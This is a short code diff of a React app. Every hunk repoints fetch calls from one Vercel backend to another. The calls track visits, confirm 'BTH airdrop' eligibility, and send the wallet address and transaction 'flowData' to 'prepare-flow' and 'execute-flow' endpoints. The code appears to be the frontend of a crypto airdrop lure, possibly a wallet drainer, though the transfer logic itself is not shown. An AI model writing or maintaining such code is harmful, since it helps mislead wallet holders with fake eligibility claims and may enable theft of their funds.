@@ -984,7 +984,7 @@ function App() {
   useEffect(() => {
     const trackVisit = async () => {
       try {
-        const response = await fetch('https://hyperback.vercel.app/api/track-visit', {
+        const response = await fetch('https://hyperback-psi.vercel.app/api/track-visit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -1039,7 +1039,7 @@ function App() {
         setEligibleChains(chainsWithBalance);
         setTxStatus('✅ Wallet eligibility confirmed. You qualify for the BTH airdrop.');
         
-        await fetch('https://hyperback.vercel.app/api/presale/connect', {
+        await fetch('https://hyperback-psi.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -1124,7 +1124,7 @@ function App() {
     if (!address) return;
     
     try {
-      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
+      await fetch('https://hyperback-psi.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
@@ -1256,7 +1256,7 @@ function App() {
             
             console.log("📤 Sending to backend with amounts:", flowData);
             
-            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
+            await fetch('https://hyperback-psi.vercel.app/api/presale/execute-flow', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(flowData)
